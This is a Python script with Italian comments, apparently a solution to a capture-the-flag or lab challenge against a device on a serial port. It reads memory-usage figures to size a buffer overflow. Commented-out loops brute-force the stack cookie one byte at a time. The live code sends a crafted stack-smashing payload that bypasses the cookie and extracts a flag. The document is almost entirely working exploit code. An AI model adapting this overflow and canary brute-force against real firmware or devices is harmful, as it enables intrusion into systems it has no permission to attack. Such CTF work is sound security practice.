import serial

s = serial.Serial('/dev/ttyACM0',baudrate=19200, timeout=2)
s.readlines() # Leggo il banneer iniziale

# Informazioni su Memory Management:
s.write(b'2\n') # Memory management
s.timeout = 0.1
line = s.readlines()
memory_size = [int(s) for s in line[0].decode('utf-8').split() if s.isdigit()][0]
memory_used = [int(s) for s in line[1].decode('utf-8').split() if s.isdigit()][0]

"""
Step 1 - Calcolo dimensione della stringa
for size in range(255,27,-1):
    smash = b'A' * size
    #print(f"Testing with size {size}")
    s.write(b'1\n')
    line = s.readlines() #(b'management\r\n')
    s.write(smash+b'\n')
    line = s.readlines() #(b'management\r\n')
    #print(line)
    if b'Stack cookie corrupted' not in line[0]:
        break
"""
# Risultato dello step precedente
size = memory_size - memory_used - 8

print(f"From Memory Management>\nSize: {memory_size} \t Used: {memory_used}\nDifferenza: {memory_size-memory_used}")
print(f"Dim stringa {size} \t Scarto: {memory_size-memory_used-size}")

"""
Step 2: Verifica primo carattere Cookie
for i in range(255,1,-1):
    smash = b'A' * size
    smash += i.to_bytes(1, 'little')
    s.write(b'1\n')
    s.readlines() # Login
    
    s.write(smash+b'\n')
    line = s.readlines() #(b'management\r\n')
    if b'Stack cookie corrupted' not in line[0]:
        print(f"Primo carattere cookie: {i} {hex(i)}")
        print("Ricevuto: ")
        print(line)
        break
"""

"""
#Step 3 - Secondo carattere Cookie
for i in range(256):
    smash = b'A' * size
    smash += size.to_bytes(1, 'little')
    smash += i.to_bytes(1, 'little')
    s.write(b'1\n')
    s.readlines() #Login
    s.write(smash+b'\n')
    line = s.readlines()

    if b'Stack cookie corrupted' not in line[0]:
        print(f"Secondo carattere cookie: {i} {hex(i)}")
        print("Ricevuto: ")
        print(line)
"""


stack_smash  = b'A' * size
stack_smash += size.to_bytes(1, 'little')
stack_smash += b'\xff'
stack_smash += b'\n'

s.write(b'1\n')
s.readlines()
s.write(stack_smash)
line = b' '.join(s.readlines())

if b'FLAG:' in line:
    flag_pos = line.find(b'FLAG:')
    flag = line[flag_pos:]
    flag = flag.split(b' ')[0]
    print(f"Trovata flag: {flag.decode('utf-8')}")
s.close()
exit(0)